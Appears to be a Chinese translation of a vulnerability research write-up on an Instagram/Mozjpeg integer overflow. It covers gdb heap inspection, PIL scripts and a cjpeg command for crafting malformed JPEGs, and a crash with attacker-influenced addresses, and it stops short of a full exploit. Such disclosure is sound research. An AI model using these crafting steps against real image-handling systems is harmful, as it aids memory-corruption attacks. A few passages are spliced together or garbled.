    This chunk belongs to the arena at 0x72c808fc00.
    addr            info                  size       usage  
    ------------------------------------------------------------    0x72a6200000    headers               0xd000     -      
    0x72a620d000    large run             0x1b000    -            
    0x72a6227000    large run             0x1b000    -      
    0x72a6228000    small run (0x180)     0x3000     10/32  
    0x72a622b000    small run (0x200)     0x1000     8/8    
    ...
    ...
    0x72a638f000    small run (0x80)      0x1000     6/32   
    0x72a6390000    small run (0x60)      0x3000     12/128 
    0x72a6393000    small run (0xc00)     0x3000     4/4    
    0x72a6396000    small run (0xc00)     0x3000     4/4    
    0x72a6399000    small run (0x200)     0x1000     2/8    
    0x72a639a000    small run (0xe0)      0x7000     6/128   0x7e47ead7dc:    bl    0x7e47eae660 
       0x7e47ead7e0:    mov    x23, x0
我们在可控的malloc之前只有一条命令，X0寄存器刚好拥有我们希望分配的大小：
    (gdb) info registers x0
    x0             0xe0        224
我们继续执行一个命令，然后再次检查X0寄存器，该寄存器现在保存了调用malloc后返回的结果：
    (gdb) x/20i $pc
    => 0x7e4cf987e0:    mov    x23, x0
    (gdb) info registers x0
    x0             0x72a639ac40    492415069248
我们从malloc获取的地址是我们可溢出对象的地址(0x72a639ac40)。 让我们使用shadow框架中的`jeinfo`方法检查其在堆上的位置。
    (gdb) jechunk 0x72a6200000
    This chunk belongs to the arena at 0x72c808fc00.
    …
    ...
    0x72a639a000    small run (0xe0)      0x7000     7/128     1. 构造大小畸形的图像
>   2. 触发错误
>   3. 生成我们控制的有效payload的副本
>   4. 将执行跳转到受我们控制的地址。
>
我们需要使用受控数据来生成损坏的JPEG。 因此，我们的下一步是确切确定Mozjpeg平台支持哪些图像格式。 我们可以从下面的代码中找出答案。
`out_color_space`表示根据图像格式确定的每个像素的位数。
    switch (cinfo->out_color_space) {
      case JCS_GRAYSCALE:
        cinfo->out_color_components = 1;
        Break;
      case JCS_RGB:
      case JCS_EXT_RGB:
      case JCS_EXT_RGBX:
      case JCS_EXT_BGR:
      case JCS_EXT_BGRX:
      case JCS_EXT_XBGR:
      case JCS_EXT_XRGB:
      case JCS_EXT_RGBA:
      case JCS_EXT_BGRA: 
      case JCS_EXT_ABGR: 
      case JCS_EXT_ARGB:
        cinfo->out_color_components = rgb_pixelsize[cinfo->out_color_space];
        Break;
      case JCS_YCbCr:
      case JCS_RGB565:
          cinfo->out_color_components = 3; 
          break; 
      case JCS_CMYK:
      case JCS_YCCK:
          cinfo->out_color_components = 4;
          break;
      default:                      
        cinfo->out_color_components = cinfo->num_components;
        Break;
我们使用了一个称为[PIL](https://imageio.readthedocs.io/en/stable/format_jpeg-pil.html)的简单Python库来构造RGB BMP文件。 我们选择了我们熟悉的RGB格式，并在其中填充了“ AAA”作为有效载荷。
该文件是我们用来创建恶意压缩JPEG的基本图像格式。
    from PIL import Image
     img = Image.new('RGB', (100, 100)) 
    pixels = img.load() 
    for i in range(img.size[0]):  
        for j in range(img.size[1]):
            pixels[i,j] = (0x41, 0x41, 0x41) 
    img.save('rgb100.bmp')
然后，我们使用Mozjpeg项目中的cjpeg工具将bmp文件压缩为JPEG文件。
    ./cjpeg -rgb -quality 100 -fastcrush -notrellis -notrellis-dc -noovershoot -outfile rgb100.jpg rgb100.bmp
接下来，我们测试了压缩后的输出文件以验证我们的假设。 我们知道RGB格式是每个像素3个字节。
我们要验证代码是否正确设置了`cinfo-> out_color_space = 0x2(JCS_RGB)`。
但是，当我们检查控制的分配时，我们看到作为整数溢出一部分的`height`和`width`参数仍然乘以值为4的`out_color_components`，纵然我们从RGB格式开始，每行使用`3x8-bit`像素。
看来Mozjpeg更倾向于将我们的图像转换为每个像素`4x8-bit`的格式。
然后，我们转向了Mozjpeg平台支持的`4x8-bit`像素格式，CMYK格式满足了标准。我们使用CMYK格式作为基本图像，以便完全控制所有4个字节。我们在图像中填充了“AAAA”作为有效载荷。
我们将其压缩为JPEG格式，并添加了可以触发程序崩溃的图片尺寸。 令我们振奋的是，我们发生了以下崩溃！
    Thread 93 "IgExecutor #19" received signal SIGBUS, Bus error.
    0xff414141ff414141 in ?? ()
但是，即使我们在每个像素图像上构建了`4x8-bit`的图像，我们也还是得到了一个奇怪的`0xFF`字节在我们可控地址中，然而其却并非有效载荷的一部分。
这个`0xFF`是什么意思？ 透明度！
支持透明的位图文件格式包括GIF，PNG，BMP，TIFF和JPEG 2000（通过颜色透明或Alpha通道）。
基于位图的图像在技术上是通过图像的宽度和高度（以像素为单位）以及每个像素的位数来表征的。
因此，我们决定使用PIL库通过受控的alpha通道（0x61）构造RGBA BMP格式文件。
    from PIL import Image
     img = Image.new('RGBA', (100, 100))
     pixels = img.load()
     for i in range(img.size[0]):  
         for j in range(img.size[1]):
             pixels[i,j] = (0x41, 0x41, 0x41,0x61)
     img.save('rgba100.bmp')
令人惊讶的是，我们得到的结果与使用CMYK构造的恶意JPEG触发崩溃的结果相同。
即便我们使用了RGBA格式作为压缩JPEG的基础，我们仍然在可控的地址中看到了`0xFF`，并且文件中的Alpha通道的值为（0x61）。 这怎么发生的？
让我们回到代码中，了解造成这种奇怪行为的原因。
最终我们在下面的这段小代码中找到了答案：
我们发现Instagram在`jpeg_read_header`完成之后并且在调用`jpeg_start_decompress`之前添加了自己的`const`值。
我们使用了第一个测试中的RGB格式，并且看到Mozjpeg确实正确设置了`cinfo-> out_color_space = 0x2(JCS_RGB)`。
但是，从Instagram的代码(图3)中，我们可以看到此值被表示为`(JCS_EXT_RGBA)`格式的const值`0xc`覆盖了。
这也解释了为什么即使我们使用每个像素`3x8-bit`的RGB对象，也得到了奇怪的`0xFF` alpha通道。
深入研究代码后，我们看到alpha通道（0xFF）的值被硬编码为const值。 当Instagram将`cinfo-> out_color_space =
0xc`设置为指向`(JCS_EXT_RGBA)`格式时，代码从输入的基本文件中复制3个字节，然后复制的第4个字节始终是硬编码的alpha通道值。
    #ifdef RGB_ALPHA
          outptr[RGB_ALPHA] = 0xFF;
    #endif
现在我们将所有内容放在一起，得出的结论是，无论将哪种图像格式用作压缩JPEG的基础，Instagram始终会将输出文件转换为RGBA格式文件。
始终在开头添加`0xff`这一事实意味着我们可以在大端环境中实现我们的目标。
小端系统将单词的最低有效字节存储在最小的存储地址中。 因为我们使用的是低位优先系统，所以Alpha通道值始终被改写为受控地址的最高有效字节。
当我们尝试在用户模式下利用该错误，并且（0xFF）开头的地址值属于内核地址空间时，它会直接挫败我们的计划。
## 可以利用吗
我们失去了快速取得胜利的可能。 但可以从中学到的一课是，现实生活不是CTF游戏，有时开发人员设定的一个关键const值可能会从开发角度破坏一切。
让我们回想一下Mozilla基金会主要网站上有关Mozjpeg的内容：
**Mozjpeg的唯一目的是减少网络上提供的JPEG文件的大小。**
据我们所知，每上传一张图片，Instagram就会增加25%的内存使用量!大约每天1亿美元!
至此，Facebook已经修补了该漏洞，因此即使我们还没有完全解决它，我们也停止了利用开发工作。
我们仍然只有3个字节的覆盖，从理论上讲，我们可以投入更多的时间来找到更多有用的原语，以帮助我们利用此错误。但是，我们认为我们已经做了足够的工作，并且已经宣传了我们想要传达的重要观点。